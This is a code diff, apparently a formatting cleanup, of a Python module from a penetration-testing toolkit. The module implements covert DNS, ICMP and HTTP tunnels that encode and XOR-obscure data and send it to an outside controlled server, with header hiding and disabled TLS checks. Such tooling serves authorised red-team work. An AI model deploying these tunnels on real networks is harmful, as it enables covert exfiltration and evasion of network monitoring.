@@ -6,31 +6,32 @@
 仅用于授权渗透测试
 """
 
-import socket
-import struct
 import base64
 import hashlib
-import time
-import threading
 import logging
+import os
 import random
 import secrets
 import select
-from typing import Dict, List, Optional, Any, Callable, Tuple
+import socket
+import struct
+import threading
+import time
 from dataclasses import dataclass, field
 from enum import Enum
+from typing import Any, Callable, Dict, List, Optional, Tuple
 
 from core.defaults import DNSDefaults
-import os
 
 logger = logging.getLogger(__name__)
 
 # DNS 库
 try:
-    import dns.resolver
     import dns.message
     import dns.query
     import dns.rdatatype
+    import dns.resolver
+
     HAS_DNSPYTHON = True
 except ImportError:
     HAS_DNSPYTHON = False
@@ -39,6 +40,7 @@ except ImportError:
 @dataclass
 class TunnelConfig:
     """隧道配置"""
+
     server: str
     port: int = 0
     encryption_key: Optional[str] = None
@@ -66,10 +68,9 @@ class DNSTunnel:
         server.run()
     """
 
-    def __init__(self,
-                 domain: str,
-                 nameserver: Optional[str] = None,
-                 encryption_key: Optional[str] = None):
+    def __init__(
+        self, domain: str, nameserver: Optional[str] = None, encryption_key: Optional[str] = None
+    ):
         """
         Args:
             domain: 隧道域名 (需要控制其 DNS 服务器)
@@ -90,7 +91,7 @@ class DNSTunnel:
     def _encode_data(self, data: bytes) -> str:
         """编码数据为 DNS 安全格式"""
         # Base32 编码 (只包含字母和数字)
-        encoded = base64.b32encode(data).decode().lower().rstrip('=')
+        encoded = base64.b32encode(data).decode().lower().rstrip("=")
         return encoded
 
     def _decode_data(self, encoded: str) -> bytes:
@@ -98,7 +99,7 @@ class DNSTunnel:
         # 补齐 padding
         padding = 8 - (len(encoded) % 8)
         if padding != 8:
-            encoded += '=' * padding
+            encoded += "=" * padding
         return base64.b32decode(encoded.upper())
 
     def _encrypt(self, data: bytes) -> bytes:
@@ -107,10 +108,7 @@ class DNSTunnel:
             return data
 
         key = self.encryption_key.encode()
-        encrypted = bytes([
-            data[i] ^ key[i % len(key)]
-            for i in range(len(data))
-        ])
+        encrypted = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
         return encrypted
 
     def _decrypt(self, data: bytes) -> bytes:
@@ -121,7 +119,7 @@ class DNSTunnel:
         """将数据分割为 DNS 标签"""
         chunks = []
         for i in range(0, len(data), self.chunk_size):
-            chunks.append(data[i:i + self.chunk_size])
+            chunks.append(data[i : i + self.chunk_size])
         return chunks
 
     def send(self, data: str) -> bool:
@@ -153,7 +151,7 @@ class DNSTunnel:
                     resolver.lifetime = DNSDefaults.TIMEOUT
 
                     # 使用 A 记录查询 (也可以用 TXT)
-                    resolver.resolve(query_name, 'A')
+                    resolver.resolve(query_name, "A")
 
                 except dns.resolver.NXDOMAIN:
                     # 预期的响应
@@ -214,9 +212,9 @@ class DNSTunnel:
         packet += struct.pack(">HHHH", 1, 0, 0, 0)
 
         # Query name
-        for label in domain.split('.'):
+        for label in domain.split("."):
             packet += struct.pack("B", len(label)) + label.encode()
-        packet += b'\x00'
+        packet += b"\x00"
 
         # Query type and class
         packet += struct.pack(">HH", qtype, 1)
@@ -251,7 +249,7 @@ class DNSTunnel:
                     data_parts.append(str(rdata))
 
             # 解码
-            encoded_data = ''.join(data_parts)
+            encoded_data = "".join(data_parts)
             decrypted = self._decrypt(self._decode_data(encoded_data))
 
             return decrypted.decode()
@@ -277,9 +275,7 @@ class ICMPTunnel:
     ICMP_ECHO_REQUEST = 8
     ICMP_ECHO_REPLY = 0
 
-    def __init__(self,
-                 target: str,
-                 encryption_key: Optional[str] = None):
+    def __init__(self, target: str, encryption_key: Optional[str] = None):
         self.target = target
         self.encryption_key = encryption_key
         self.sequence = 0
@@ -287,12 +283,12 @@ class ICMPTunnel:
     def _checksum(self, data: bytes) -> int:
         """计算 ICMP 校验和"""
         if len(data) % 2:
-            data += b'\x00'
+            data += b"\x00"
 
         s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
-        s = (s >> 16) + (s & 0xffff)
+        s = (s >> 16) + (s & 0xFFFF)
         s += s >> 16
-        return ~s & 0xffff
+        return ~s & 0xFFFF
 
     def _encrypt(self, data: bytes) -> bytes:
         """加密数据"""
@@ -330,7 +326,7 @@ class ICMPTunnel:
             # 分块发送
             chunk_size = 1400  # MTU 限制
             for i in range(0, len(encrypted), chunk_size):
-                chunk = encrypted[i:i + chunk_size]
+                chunk = encrypted[i : i + chunk_size]
                 packet = self._build_icmp_packet(chunk)
                 sock.sendto(packet, (self.target, 0))
                 time.sleep(0.1)
@@ -371,9 +367,9 @@ class ICMPTunnel:
             sock.close()
 
             if data_parts:
-                combined = b''.join(data_parts)
+                combined = b"".join(data_parts)
                 decrypted = self._encrypt(combined)  # XOR 解密
-                return decrypted.decode(errors='ignore')
+                return decrypted.decode(errors="ignore")
 
             return None
 
@@ -398,10 +394,7 @@ class HTTPTunnel:
     - 自定义 Header 隐写
     """
 
-    def __init__(self,
-                 server_url: str,
-                 encryption_key: Optional[str] = None,
-                 method: str = "POST"):
+    def __init__(self, server_url: str, encryption_key: Optional[str] = None, method: str = "POST"):
         """
         Args:
             server_url: 服务器 URL
@@ -429,9 +422,7 @@ class HTTPTunnel:
         """解码"""
         return base64.urlsafe_b64decode(data)
 
-    def send(self,
-             data: str,
-             hide_in: str = "body") -> Optional[str]:
+    def send(self, data: str, hide_in: str = "body") -> Optional[str]:
         """
         发送数据
 
@@ -466,7 +457,9 @@ class HTTPTunnel:
                     "d": encoded,
                     "_": str(int(time.time() * 1000)),
                 }
-                response = req.get(self.server_url, params=params, headers=headers, timeout=30, verify=False)
+                response = req.get(
+                    self.server_url, params=params, headers=headers, timeout=30, verify=False
+                )
 
             else:  # body
                 post_data = {
@@ -474,7 +467,9 @@ class HTTPTunnel:
                     "data": encoded,
                     "timestamp": int(time.time()),
                 }
-                response = req.post(self.server_url, json=post_data, headers=headers, timeout=30, verify=False)
+                response = req.post(
+                    self.server_url, json=post_data, headers=headers, timeout=30, verify=False
+                )
 
             if response.status_code == 200:
                 # 尝试从响应中提取返回数据
@@ -507,12 +502,7 @@ class HTTPTunnel:
                 "X-Session-ID": self.session_id,
             }
 
-            response = req.get(
-                f"{self.server_url}/poll",
-                headers=headers,
-                timeout=30,
-                verify=False
-            )
+            response = req.get(f"{self.server_url}/poll", headers=headers, timeout=30, verify=False)
 
             if response.status_code == 200:
                 try:
@@ -531,27 +521,25 @@ class HTTPTunnel:
 
 
 # 便捷函数
-def create_dns_tunnel(domain: str,
-                      nameserver: Optional[str] = None,
-                      encryption_key: Optional[str] = None) -> DNSTunnel:
+def create_dns_tunnel(
+    domain: str, nameserver: Optional[str] = None, encryption_key: Optional[str] = None
+) -> DNSTunnel:
     """创建 DNS 隧道"""
     return DNSTunnel(domain, nameserver, encryption_key)
 
 
-def create_icmp_tunnel(target: str,
-                       encryption_key: Optional[str] = None) -> ICMPTunnel:
+def create_icmp_tunnel(target: str, encryption_key: Optional[str] = None) -> ICMPTunnel:
     """创建 ICMP 隧道"""
     return ICMPTunnel(target, encryption_key)
 
 
-def create_http_tunnel(server_url: str,
-                       encryption_key: Optional[str] = None) -> HTTPTunnel:
+def create_http_tunnel(server_url: str, encryption_key: Optional[str] = None) -> HTTPTunnel:
     """创建 HTTP 隧道"""
     return HTTPTunnel(server_url, encryption_key)
 
 
 if __name__ == "__main__":
-    logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')
+    logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")
     logger.info("Covert Channel Tunnels Module")
     logger.info("=" * 50)
     logger.info(f"dnspython available: {HAS_DNSPYTHON}")
